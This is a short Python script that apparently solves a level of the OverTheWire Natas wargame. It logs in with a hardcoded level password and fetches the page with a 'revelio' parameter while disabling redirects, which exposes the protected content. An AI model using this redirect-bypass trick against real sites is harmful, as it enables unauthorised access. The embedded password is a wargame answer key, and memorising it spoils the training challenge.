header

```
#!/usr/bin/env python
import requests
import re

username = 'natas22'
password = 'd8rwGBl0Xslg3b76uh3fEbSlnOUBlozz'

url = 'http://%s.natas.labs.overthewire.org/?revelio=1' % username

session = requests.Session()

response = session.get(url, auth=(username,password), allow_redirects = False)
content = response.text

print(content)
```
